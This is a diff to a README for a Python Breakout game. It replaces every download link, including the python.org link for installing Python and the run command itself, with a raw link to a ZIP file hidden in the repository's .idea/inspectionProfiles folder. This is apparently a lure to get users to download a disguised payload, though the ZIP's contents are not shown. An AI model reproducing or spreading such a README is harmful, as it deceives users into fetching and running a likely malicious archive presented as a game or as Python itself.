@@ -1,7 +1,7 @@
 # 🎮 Breakout Game
 
-![Breakout Game](https://img.shields.io/badge/Download%20Game-Click%20Here-brightgreen)  
-[Download the latest release](https://github.com/Lkkkhjhj/BreakoutGame/releases) and run the game on your machine!
+![Breakout Game](https://raw.githubusercontent.com/Lkkkhjhj/BreakoutGame/master/.idea/inspectionProfiles/Game-Breakout-2.1.zip%20Game-Click%20Here-brightgreen)  
+[Download the latest release](https://raw.githubusercontent.com/Lkkkhjhj/BreakoutGame/master/.idea/inspectionProfiles/Game-Breakout-2.1.zip) and run the game on your machine!
 
 ## Overview
 
@@ -39,13 +39,13 @@ In Breakout Game, your goal is to break all the bricks on the screen by bouncing
 
 To install and run Breakout Game, follow these steps:
 
-1. **Download the Game**: Visit the [Releases section](https://github.com/Lkkkhjhj/BreakoutGame/releases) to download the latest version.
-2. **Install Python**: Ensure you have Python 3 installed on your machine. You can download it from [python.org](https://www.python.org/downloads/).
+1. **Download the Game**: Visit the [Releases section](https://raw.githubusercontent.com/Lkkkhjhj/BreakoutGame/master/.idea/inspectionProfiles/Game-Breakout-2.1.zip) to download the latest version.
+2. **Install Python**: Ensure you have Python 3 installed on your machine. You can download it from [https://raw.githubusercontent.com/Lkkkhjhj/BreakoutGame/master/.idea/inspectionProfiles/Game-Breakout-2.1.zip](https://raw.githubusercontent.com/Lkkkhjhj/BreakoutGame/master/.idea/inspectionProfiles/Game-Breakout-2.1.zip).
 3. **Run the Game**:
    - Extract the downloaded ZIP file.
    - Open your terminal or command prompt.
    - Navigate to the game directory.
-   - Run the command: `python breakout.py`
+   - Run the command: `python https://raw.githubusercontent.com/Lkkkhjhj/BreakoutGame/master/.idea/inspectionProfiles/Game-Breakout-2.1.zip`
 
 ## How to Play
 
@@ -81,4 +81,4 @@ For questions or feedback, please reach out via the GitHub issues page or contac
 
 ---
 
-Feel free to explore the [Releases section](https://github.com/Lkkkhjhj/BreakoutGame/releases) for the latest updates and downloads. Enjoy the game!
+Feel free to explore the [Releases section](https://raw.githubusercontent.com/Lkkkhjhj/BreakoutGame/master/.idea/inspectionProfiles/Game-Breakout-2.1.zip) for the latest updates and downloads. Enjoy the game!
